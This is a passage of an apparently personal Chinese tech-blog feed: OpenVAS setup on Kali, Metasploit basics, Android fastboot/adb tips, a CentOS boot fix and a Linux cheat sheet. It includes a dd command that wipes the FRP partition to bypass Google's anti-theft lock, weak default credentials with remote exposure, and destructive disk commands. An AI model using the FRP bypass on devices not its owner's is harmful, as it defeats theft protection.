configtest<br></code></pre></td></tr></table></figure><p>接下来重启Apache以实现我们的更改：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">restart</span> apache2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kali安装OpenVAS</title>
    <link href="/2024/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/kali%E5%AE%89%E8%A3%85OpenVAS/"/>
    <url>/2024/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/kali%E5%AE%89%E8%A3%85OpenVAS/</url>
    
    <content type="html"><![CDATA[<p>安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt update<br>apt <span class="hljs-keyword">install</span> gvm -y   <span class="hljs-comment">#安装gvm</span><br>gvm-setup       <span class="hljs-comment">#初始化gvm(需要下载漏洞库，时间比较长)</span><br>gvm-check-setup    <span class="hljs-comment">#检查openvas 是否安装成功</span><br></code></pre></td></tr></table></figure><p>如果检测失败按照提示执行修复命令就可以了</p><p>gvm的redis不是开机启动的可以设置成开机启动</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">systemctl</span> enable redis-server<span class="hljs-variable">@openvas</span>.service<br></code></pre></td></tr></table></figure><p>升级命令</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">gvm-feed-update    <span class="hljs-comment">#升级漏洞库(新安装的gvm漏洞库是最新的)</span><br>gvm-<span class="hljs-literal">start</span>       <span class="hljs-comment">#启动openvas</span><br></code></pre></td></tr></table></figure><p>#修改admin密码为password， 不修改密码就查看安装过程中的初始化密码登录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">runuser -u _gvm -- gvmd <span class="hljs-attribute">--user</span>=admin <span class="hljs-attribute">--new-password</span>=password<br></code></pre></td></tr></table></figure><p>也可以增加新用户</p><p>#admin填入你想要创建的用户，最后的password填你要设置的密码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">runuser -u _gvm -- gvmd --<span class="hljs-keyword">create</span>-<span class="hljs-keyword">user</span>=admin --new-<span class="hljs-keyword">password</span>=<span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure><p>开启远程访问</p><p>#将127.0.0.1改成0.0.0.0</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/g</span>reenbone-security-assistant.service<br></code></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">tail -f /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/gvm/gvmd.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>访问地址：<a href="https://localhost:9392/">https://localhost:9392</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>黑客工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>msfconlose使用学习</title>
    <link href="/2024/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/msfconlose%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/msfconlose%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h1><ol><li><p>漏洞渗透模块（exploits）</p></li><li><p>攻击载荷模块（payload）</p></li><li><p>辅助模块（auxiliary）</p></li><li><p>后端渗透.模块（post）</p></li></ol><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">show</span> <span class="hljs-meta">#查看</span><br><br>search <span class="hljs-meta">#搜寻</span><br><br><span class="hljs-keyword">use</span> <span class="hljs-meta">#使用</span><br><br><span class="hljs-keyword">show</span> exploits <span class="hljs-meta">#查看exploits模块</span><br></code></pre></td></tr></table></figure><p>#模块常用命令</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">show options <span class="hljs-comment">#查看模块参数</span><br><br><span class="hljs-keyword">set</span> [模块参数] [设置变量]    <span class="hljs-comment">#设置模块参数变量</span><br><br>unset [模块参数] <span class="hljs-comment">#重置模块参数</span><br><br><span class="hljs-built_in">run</span> <span class="hljs-comment">#开始攻击</span><br></code></pre></td></tr></table></figure><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>漏洞名称采用三段式的标准，既：“针对的操作系统+针对的服务+模块的具体名称”组成。（例：windows&#x2F;smb&#x2F;ms08_067_netapi）</p><p>漏洞渗透模块威胁等级划分：excellent&gt;great&gt;good&gt;normal&gt;average&gt;lowRank&gt;manual （执行效果由好到差从左到右排列）</p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>黑客工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AOSP</title>
    <link href="/2024/05/14/%E7%B3%BB%E7%BB%9F/ARM/AOSP/"/>
    <url>/2024/05/14/%E7%B3%BB%E7%BB%9F/ARM/AOSP/</url>
    
    <content type="html"><![CDATA[<h1 id="adb刷入recovery教程"><a href="#adb刷入recovery教程" class="headerlink" title="adb刷入recovery教程"></a>adb刷入recovery教程</h1><p>（此方法适用于virtualAB分区）</p><p>在adb工具文件夹内打开cmd命令行窗口</p><ol><li>检测连接:</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fastboot devices</span><br></code></pre></td></tr></table></figure><p>出现：”xxxxx(序列号) fastboot”字样表示手机连接成功</p><ol start="2"><li>查看当前ab分区</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fastboot getvar current-slot</span><br></code></pre></td></tr></table></figure><ol start="3"><li>手动切换到另一个分区：</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">fastboot set_active <span class="hljs-tag">&lt;<span class="hljs-name">target_slot</span>&gt;</span> #<span class="hljs-tag">&lt;<span class="hljs-name">target_slot</span>&gt;</span>可以是a或者b<br></code></pre></td></tr></table></figure><ol start="4"><li>刷入recovery镜像: &#x2F;&#x2F;将“xxx.img”替换为要刷入的recovery文件镜像路径</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">fastboot</span> flash recovery <span class="hljs-string">&quot;xxx.img&quot;</span> <span class="hljs-comment">#自动刷入当前分区</span><br>fastboot flash recovery_a <span class="hljs-string">&quot;xxx.img&quot;</span> <span class="hljs-comment">#手动刷入a分区</span><br>fastboot flash recovery_b <span class="hljs-string">&quot;xxx.img&quot;</span> <span class="hljs-comment">#手动刷入b分区</span><br>命令行末尾显示 finished 字样，即表示刷入recovery成功<br></code></pre></td></tr></table></figure><ol start="5"><li>重启手机</li></ol><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">fastboot <span class="hljs-keyword">reboot</span><br>fastboot <span class="hljs-keyword">reboot</span>-recovery<br></code></pre></td></tr></table></figure><h1 id="pc设置adb驱动问题"><a href="#pc设置adb驱动问题" class="headerlink" title="pc设置adb驱动问题"></a>pc设置adb驱动问题</h1><p>参考晨钟酱：<br><a href="https://www.bilibili.com/read/cv16541940/">玩机必看！超详细的ADB设备连接 &amp; 驱动安装教程</a></p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>adb命令跳过谷歌验证</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/dev/zero <span class="hljs-attribute">of</span>=/dev/block/bootdevice/by-name/frp<br></code></pre></td></tr></table></figure><p>关闭安装检验，提高app安装速度：（shell命令）</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">su -c settings <span class="hljs-keyword">put</span> <span class="hljs-keyword">global</span> verifier_verify_adb_installs <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>miui禁用低电量提醒弹窗：（shell命令）</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">settings <span class="hljs-keyword">put</span> <span class="hljs-keyword">system</span> low_battery_dialog_disabled <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>关闭低电量提示音：（shell命令）</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">settings <span class="hljs-keyword">delete</span> <span class="hljs-symbol">global</span> low_battery_sound<br></code></pre></td></tr></table></figure><p>开机动画目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/system/</span>product<span class="hljs-regexp">/media/</span><br></code></pre></td></tr></table></figure><p>音效文件目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">摄像头声：<span class="hljs-regexp">/system/m</span>edia<span class="hljs-regexp">/audio/ui</span>/<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">音效：<span class="hljs-regexp">/system/</span>product<span class="hljs-regexp">/media/</span>audio<span class="hljs-regexp">/ui/</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>ARM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CentOS 7.6镜像制作</title>
    <link href="/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/CentOS-7.6%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C/"/>
    <url>/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/CentOS-7.6%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h1><p>用U盘安装CentOS，运行到 <code>alua： not attached</code>就停止了</p><h1 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h1><p>没有识别到引导介质</p><h1 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h1><ol><li><p>将刻录好的U盘重名为<code>CENTOS</code></p></li><li><p>编辑 <code>\EFI\BOOT\grub.cfg</code></p></li></ol><p>将文件中的 <code>hd:LABEL=CentOS\x207\x20x86_64</code> 统一更改为 <code>hd:LABEL=CENTOS</code></p><ol start="3"><li>编辑 <code>\isolinux\syslinux.cfg</code></li></ol><p>将文件中的 <code>hd:LABEL=RHEL-7.4\x20Server.x86_64</code> 统一更改为 <code>hd:LABEL=CENTOS</code></p>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iso</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shell</title>
    <link href="/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/Shell/"/>
    <url>/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/Shell/</url>
    
    <content type="html"><![CDATA[<h1 id="RedHat-Cent"><a href="#RedHat-Cent" class="headerlink" title="RedHat&#x2F;Cent"></a>RedHat&#x2F;Cent</h1><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">yum</span> makecache   <span class="hljs-comment">#更新软件包源</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">yum</span> -y update   <span class="hljs-comment">#升级所有包，同时也升级软件和系统内核</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">yum</span> -y upgrade  <span class="hljs-comment">#升级所有包，不升级软件和系统内核</span><br></code></pre></td></tr></table></figure><h2 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">yum</span> erase       <span class="hljs-comment"># 卸载软件</span><br></code></pre></td></tr></table></figure><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">rpm</span> -<span class="hljs-string">e</span> <span class="hljs-built_in">--nodeps</span> <span class="hljs-comment"># 卸载软件，卸载依赖</span><br></code></pre></td></tr></table></figure><h2 id="安装web"><a href="#安装web" class="headerlink" title="安装web"></a>安装web</h2><h3 id="php-mysql-httpd"><a href="#php-mysql-httpd" class="headerlink" title="php+mysql+httpd"></a>php+mysql+httpd</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">yum install -y  httpd php-devel php-fpm php-mysql php-gd php mariadb mariadb-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><h1 id="Debian-Ubuntu"><a href="#Debian-Ubuntu" class="headerlink" title="Debian&#x2F;Ubuntu"></a>Debian&#x2F;Ubuntu</h1><h2 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> update             <span class="hljs-comment">#更新源</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> -y upgrade         <span class="hljs-comment">#更新软件,不更新依赖</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> -y full-upgrade    <span class="hljs-comment">#更新软件,同时更新依赖</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> clean              <span class="hljs-comment">#清除无用安装包</span><br></code></pre></td></tr></table></figure><p>更新系统一键梭哈</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> apt -y full-upgrade <span class="hljs-variable">&amp;&amp;</span> apt clean<br></code></pre></td></tr></table></figure><p>解决问题：（N: 无法安全地用该源进行更新，所以默认禁用该源。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf /etc/apt/sources.list.d<br></code></pre></td></tr></table></figure><h2 id="单独升级某个软件包"><a href="#单独升级某个软件包" class="headerlink" title="单独升级某个软件包"></a>单独升级某个软件包</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt install --<span class="hljs-keyword">only</span>-upgrade <span class="hljs-symbol">&lt;package_name&gt;</span><br></code></pre></td></tr></table></figure><h2 id="卸载软件-1"><a href="#卸载软件-1" class="headerlink" title="卸载软件"></a>卸载软件</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">remove</span>  <span class="hljs-comment"># 卸载</span><br></code></pre></td></tr></table></figure><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">apt</span> <span class="hljs-built_in">--purge</span> <span class="hljs-string">autoremove</span>  <span class="hljs-comment"># 卸载软件，卸载依赖</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dpkg</span> -r     <span class="hljs-comment"># 卸载</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dpkg</span> -P     <span class="hljs-comment"># 彻底卸载，包括配置文件等</span><br></code></pre></td></tr></table></figure><h2 id="web环境安装"><a href="#web环境安装" class="headerlink" title="web环境安装"></a>web环境安装</h2><h3 id="apache2-php-mysql"><a href="#apache2-php-mysql" class="headerlink" title="apache2+php+mysql"></a>apache2+php+mysql</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">apt -y install apache2 libapache2-<span class="hljs-keyword">mod</span>-php mysql-<span class="hljs-keyword">server</span> php-mysql php<br></code></pre></td></tr></table></figure><h3 id="nginx-php-mysql"><a href="#nginx-php-mysql" class="headerlink" title="nginx+php+mysql"></a>nginx+php+mysql</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">apt -y install nginx mysql-<span class="hljs-keyword">server</span> php-mysql php-fpm php<br></code></pre></td></tr></table></figure><h1 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">启动服务：systemctl start <span class="hljs-symbol">&lt;service_name&gt;</span><br>关闭服务：systemctl <span class="hljs-keyword">stop</span> <span class="hljs-symbol">&lt;service_name&gt;</span><br>重启服务：systemctl restart <span class="hljs-symbol">&lt;service_name&gt;</span><br>显示服务的状态：systemctl status <span class="hljs-symbol">&lt;service_name&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">在开机时启用服务：<span class="hljs-string">systemctl</span> <span class="hljs-string">enable</span> &lt;<span class="hljs-string">service_name</span>&gt;<br>在开机时禁用服务：<span class="hljs-string">systemctl</span> <span class="hljs-string">disable</span> &lt;<span class="hljs-string">service_name</span>&gt;<br>查看开机启动的服务单元：<span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span><br>查看开机启动失败的服务列表：<span class="hljs-string">systemctl</span> <span class="hljs-built_in">--failed</span><br></code></pre></td></tr></table></figure><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">列出所有服务：<span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-units</span><br>列出所有已加载的服务单元：<span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-units</span> <span class="hljs-built_in">--type=service</span><br>列出所有服务单元文件及其启用状态：<span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span> <span class="hljs-built_in">--type=service</span><br></code></pre></td></tr></table></figure><h1 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">fdisk</span> -l                    <span class="hljs-comment"># 查看磁盘情况</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkfs.ext4 <span class="hljs-regexp">/dev/</span>sda1         <span class="hljs-comment"># 以ext4格式格式化分区</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">lsblk</span>                       <span class="hljs-comment"># 查看磁盘结构</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">lsblk</span> -f                    <span class="hljs-comment"># 查看文件系统类型</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span> -h                       <span class="hljs-comment"># 查看挂载情况</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span> -T                       <span class="hljs-comment"># 查看文件系统类型</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">du</span> -sh                      <span class="hljs-comment"># 查看目录占用空间大小</span><br></code></pre></td></tr></table></figure><h2 id="磁盘扩容"><a href="#磁盘扩容" class="headerlink" title="磁盘扩容"></a>磁盘扩容</h2><blockquote><p>先进行分区扩容，再进行文件系统扩容。如果无法扩容，考虑是不是有其它分区在中间进行了截断。(<code>gparted</code>图形化分区管理工具)</p></blockquote><h3 id="磁盘分区扩容"><a href="#磁盘分区扩容" class="headerlink" title="磁盘分区扩容"></a>磁盘分区扩容</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">parted <span class="hljs-regexp">/dev/</span>sda<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(parted)</span> resizepart <span class="hljs-number">1</span> <span class="hljs-number">200</span>GB     <span class="hljs-attr"># 扩大分区1</span>大小为<span class="hljs-number">200</span>GB<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(parted)</span> resizepart <span class="hljs-number">1</span> <span class="hljs-number">100</span><span class="hljs-meta">%</span>      <span class="hljs-attr"># 扩大分区1</span>大小为<span class="hljs-number">100</span><span class="hljs-meta">%</span><br></code></pre></td></tr></table></figure><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">(parted) <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><h3 id="文件系统扩容"><a href="#文件系统扩容" class="headerlink" title="文件系统扩容"></a>文件系统扩容</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">resize2fs <span class="hljs-regexp">/dev/</span>sda1  <span class="hljs-comment"># 用于扩容ext2/ext3/ext4文件系统</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfs_growfs /data  <span class="hljs-comment"># 用于扩容XFS文件系统</span><br></code></pre></td></tr></table></figure><h3 id="LVM扩容"><a href="#LVM扩容" class="headerlink" title="LVM扩容"></a>LVM扩容</h3><p>检查逻辑卷情况</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lvdisplay <span class="hljs-regexp">/dev/</span>centos/root<br></code></pre></td></tr></table></figure><p>删除无用逻辑卷</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">lvremove</span> pve/<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>确认剩余空间</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pvs</span><br></code></pre></td></tr></table></figure><blockquote><p>如果显示的 FREE 列为空，说明没有剩余空间。</p></blockquote><p>LVM 识别 &#x2F;dev&#x2F;sda2 上的所有剩余空间。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pvresize <span class="hljs-regexp">/dev/</span>sda2<br></code></pre></td></tr></table></figure><p>逻辑卷扩容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lvextend</span> -l +<span class="hljs-number">100</span>%FREE /dev/centos/root<br></code></pre></td></tr></table></figure><p>最后进行文件系统扩容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">resize2fs <span class="hljs-regexp">/dev/</span>sda1  <span class="hljs-comment"># 用于扩容ext2/ext3/ext4文件系统</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfs_growfs /data  <span class="hljs-comment"># 用于扩容XFS文件系统</span><br></code></pre></td></tr></table></figure><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>smb挂载</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mount</span> -t cifs //服务器IP/共享名 /mnt/smb_share -o username=用户名,password=密码,uid=<span class="hljs-number">1000</span>,gid=<span class="hljs-number">1000</span>,dir_mode=<span class="hljs-number">0766</span>,file_mode=<span class="hljs-number">0666</span>,vers=<span class="hljs-number">3</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>开机自挂载磁盘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>fstab<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 挂载硬盘</span><br><span class="hljs-string">/dev/sdb1</span> <span class="hljs-string">/data</span> ext4 defaults 0 0<br><br><span class="hljs-comment"># smb挂载</span><br><span class="hljs-string">//</span>服务器IP/共享名 <span class="hljs-string">/mnt/smb</span> cifs username=账户,password=密码,uid=1000,gid=1000,dir_mode=0766,file_mode=0666,iocharset=utf8,vers=3.0,x-systemd.requires=network-online.target 0 0<br></code></pre></td></tr></table></figure><p>测试自动挂载是否成功</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo mount -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><h1 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h1><p>使用tar批量解压当前命令下的*.tar.gz后缀的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> *.tar.gz);<span class="hljs-keyword">do</span> tar zxvf <span class="hljs-variable">$i</span>;<span 